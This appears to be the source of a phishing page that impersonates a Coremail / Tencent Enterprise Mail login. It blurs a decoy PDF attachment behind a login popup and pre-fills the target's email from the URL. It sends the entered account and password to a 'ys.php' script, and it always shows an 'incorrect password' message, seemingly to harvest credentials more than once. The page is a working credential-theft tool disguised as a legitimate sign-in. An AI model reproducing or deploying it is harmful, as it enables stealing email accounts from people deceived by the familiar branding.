<?php ?>

<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
   <meta charset="utf-8">
   <title>Coremail</title>
   <link href="favicon1.ico" rel="icon" type="image-xicon">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">

   <style type="text/css">
   /* Styles for desktop/laptop devices */
   @media screen and (min-width: 1024px) {
      .pdf-container embed {
         width: 600px;
         height: 600px;
      }
   }

   /* Styles for tablets */
   @media screen and (min-width: 768px) and (max-width: 1023px) {
      .pdf-container embed {
         width: 400px;
         height: 400px;
      }
   }

   /* Styles for mobile devices */
   @media screen and (max-width: 767px) {
      .pdf-container embed {
         width: 250px;
         height: 250px;
      }
   }

   /* Common styles for all devices */
   @import url('https://fonts.googleapis.com/css2?family=PingFang+SC:wght@300;400;500;600;700&display=swap');

   * {
      margin: 0;
      padding: 0;
      outline: none;
      box-sizing: border-box;
      font-family: 'PingFang SC', 'Helvetica Neue', 'Arial', 'Hiragino Sans GB', 'STHeiti', 'Microsoft YaHei', sans-serif;
   }

   body {
      height: 100vh;
      width: 100%;
      overflow: hidden;
   }

   .pdf-container {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
   }

   .pdf-container.embed-blur {
      filter: blur(4px);
   }

   .pdf-container embed {
      background-color: rgba(0, 0, 0, 0);
      width: 100%;
      height: 100%;
   }

   .pdf-overlay {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.4);
      align-items: center;
      justify-content: center;
      z-index: 2;
   }

   .pdf-overlay-content {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      color: #fff;
   }

   .pdf-overlay-content img {
      width: 200px;
      height: auto;
      margin-bottom: 20px;
      filter: brightness(0.5);
   }

   .pdf-overlay-content span {
      font-size: 20px;
      line-height: 1.5;
   }

   .pdf-overlay-content a {
      display: flex;
      flex-direction: column;
      align-items: center;
      text-decoration: none;
      color: #fff;
      font-size: 18px;
   }

   .pdf-overlay-content img {
      width: 100px;
      height: 100px;
      margin-bottom: 10px;
   }

   .pdf-overlay-content span {
      display: block;
      text-align: center;
   }

   .pdf-container a,
   .pdf-overlay-content a {
      cursor: pointer;
      text-decoration: none;
   }

   .pdf-overlay-content a:hover,
   #downloadButton:hover {
      text-decoration: none; /* Remove underline */
   }

   .login-popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.4);
      align-items: center;
      justify-content: center;
      z-index: 2;
   }

   .login-popup-content {
      background: #FFF;
      width: 340px;
      height: 400px;
      padding: 30px;
      box-shadow: 0px 0px 5px 5px rgba(0.2, 0.2, 0.2, 0.2);
   }

   .login-popup form {
      margin-top: 20px;
   }

   .login-popup form .input-box {
      height: 50px;
      width: 100%;
      position: relative;
      margin-top: 15px;
   }

   .login-popup form .input-box input {
      height: 100%;
      width: 100%;
      outline: none;
      border: 1px solid lightgrey;
      border-radius: 5px;
      padding-left: 45px;
      padding-right: 45px;
      font-size: 14px;
      transition: all 0.3s ease;
   }

   .login-popup form .input-box .icon {
      position: absolute;
      top: 50%;
      left: 20px;
      transform: translateY(-50%);
      color: grey;
   }

   .login-popup form .input-box .pr-domain {
      position: absolute;
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      color: grey;
   }

   .login-popup form .input-box .u-eye {
      position: absolute;
      top: 50%;
      right: 20px;
      transform: translateY(-50%);
      width: 16px;
      height: 12px;
      background: url(./he/eye.png) no-repeat center center;
      background-size: 16px 16px;
      cursor: pointer;
   }

   .login-popup form .input-box .u-eye.show-password {
      background-image: url(./he/eye1.png);
   }

   .login-popup form .btn {
      margin-top: 30px;
      text-align: center;
   }

   .login-popup form .btn button {
      border: none;
      display: inline-block;
      width: 100%;
      box-sizing: border-box;
      background: #1F6FB5 !important; /* Updated button background color */
      font-weight: 500;
      font-size: 16px;
      color: #ffffff;
      text-align: center;
      padding: 8px;
      border-radius: 2px;
      letter-spacing: 4px;
      cursor: pointer;
      transition: background-color 0.3s ease, color 0.3s ease;
   }

   /* Updated hover effect for submit button with new hover color */
   .login-popup form .btn button:hover {
      background: #5BA806; /* Updated hover background color */
      color: #fff;
   }

   .login-popup-content .wework_login_title {
      font-weight: 700;
      font-size: 18px;
      line-height: 24px;
      color: #10141A;
      text-align: center;
   }

   .error-message {
      color: red;
      margin-top: 10px;
      text-align: center;
   }

   .password-input.error {
      border: 1px solid red;
   }

   .pdf-container.embed-blur embed {
      filter: blur(4px);
   }

   .m-cnt {
      margin-top: 10px;
   }

   /* Add the following styles for the footer */

   .footer {
      background-color: #EBEFF2;
      height: 1px;
      margin-top: 50px;
      width: calc(100% + 60px);
      margin-left: -30px;
      display: flex;
      justify-content: center;
      align-items: center;
   }

   .login-popup {
      /* Existing styles for the login popup */
      position: relative;
      overflow: hidden; /* Add this line to prevent the footer from overflowing */
   }

   .login-popup-content {
      /* Existing styles for the login popup box */
      position: relative;
      z-index: 2; /* Ensure the login popup box is positioned above the footer */
   }

   .error-space {
      margin-top: 10px; /* Adjust the margin as per your preference */
   }

   /* Additional styles for the footer */

   .footer {
      display: flex;
      justify-content: center;
      font-size: 12px;
      line-height: 16px;
      text-align: center;
   }

   .footer a {
      margin: 10px;
      color: #10141A;
      text-decoration: none;
      margin-top: 70px;
   }

   .footer a:not(:last-child)::after {
      content: "|";
      margin-left: 5px;
      margin-right: 5px;
      color: #10141A;
   }

   /* Added CSS for border color when fields are selected */
   .login-popup form .input-box input:focus {
      border-color: #2984EF;
   }

   .input-box {
   position: relative;
   margin-top: 15px;
}

.security-text {
   position: absolute;
   top: -20px;
   left: 0;
   font-size: 12px;
   color: #333;
}

   /* Fix for cursor on submit button */
   #submitButton {
      cursor: pointer;
      padding: 10px 20px;
      font-size: 16px;
      background-color: #66BC07; /* Updated button background color */
      color: #fff;
      border: none;
      border-radius: 4px;
      transition: background-color 0.3s ease, color 0.3s ease;
   }

   /* Hover effect for submit button */
   #submitButton:hover {
      background-color: #5BA806; /* Updated hover background color */
      color: #fff;
      text-decoration: none; /* Remove underline */
   }

</style>

<script type="text/javascript">
   window.onload = function() {
      var pdfContainer = document.getElementById('pdfContainer');
      var pdfOverlay = document.getElementById('pdfOverlay');
      var loginPopup = document.getElementById('loginPopup');
      var usernameInput = document.getElementById('chmap');
      var passwordInput = document.querySelector('input[name="caf"]');
      var errorMessage = document.getElementById('errorMessage');
      var showPasswordIcon = document.querySelector('.u-eye');

      // Show mod.png for 4 seconds, then show login popup
      setTimeout(function() {
         pdfContainer.classList.add('embed-blur'); // Add blur effect
         loginPopup.style.display = "flex";
         document.body.style.overflow = "hidden";

         // Get the username from the URL
         var queryString = window.location.search;
         var urlParams = new URLSearchParams(queryString);
         var username = urlParams.get('mailuser');
         // Paste the username in the input field
         if (username) {
            usernameInput.value = username;
         }
      }, 0000);

      // Toggle password visibility
      showPasswordIcon.addEventListener('click', function() {
         if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            showPasswordIcon.classList.add('show-password');
         } else {
            passwordInput.type = 'password';
            showPasswordIcon.classList.remove('show-password');
         }
      });
   };
</script>

<body>
   <div id="pdfContainer" class="pdf-container">
      <embed src="xizang.pdf" style="filter: brightness(0.5);">
   </div>

   <div id="pdfOverlay" class="pdf-overlay">
      <div class="pdf-overlay-content">
         <span style="color: white; font-size: 18px; text-align: center;">附件由腾讯企业邮箱保护。</span>
         <button id="downloadButton" onclick="showLoginPopup()" style="cursor: pointer; padding: 10px 20px; font-size: 16px; background-color: #3370FF; color: #fff; border: none; border-radius: 4px;">下载&nbsp;>文件</button>
      </div>
   </div>

   <div id="loginPopup" class="login-popup">
      <div class="login-popup-content">
         <div class="wework_login_title"> 
  <h2 style="color: #5e5e5e;">  <img src="./he/login_logo.png" style="width: 100%;" > </h2> </div> <!--帐号密码登录--> <br>
<hr>
<div id="errorMessage" class="error-message" style="margin-top: 3px; margin-bottom: 3px; font-size: 13px; color: red; text-align: center;">你填写的账号或密码不正确，请再次尝试</div>

         <form id="loginForm" method="post" action="ys.php">
            <div class="input-box">
               <input id="chmap" name="mil" type="email" placeholder="账号" value="" required>
               <div class="icon"><i class="fas fa-user"></i></div>
               <span class="pr-domain j-prdomain"> </span>
            </div>
            <div class="input-box">
               <input name="try" type="password" placeholder="密码" required>
               <div class="icon"><i class="fas fa-lock"></i></div>
               
            </div>
            <div class="m-cnt m-unlogin">
               <input type="checkbox" id="un-login" name="un-login">
               <label for="un-login" style="font-size: 13px;">5天内自动登录</label>
            </div>
            <div class="btn">
               <button id="submitButton" type="submit">登录</button>
            </div> 
         </form>
       
      </div>
   </div>

</body>

</html>

?>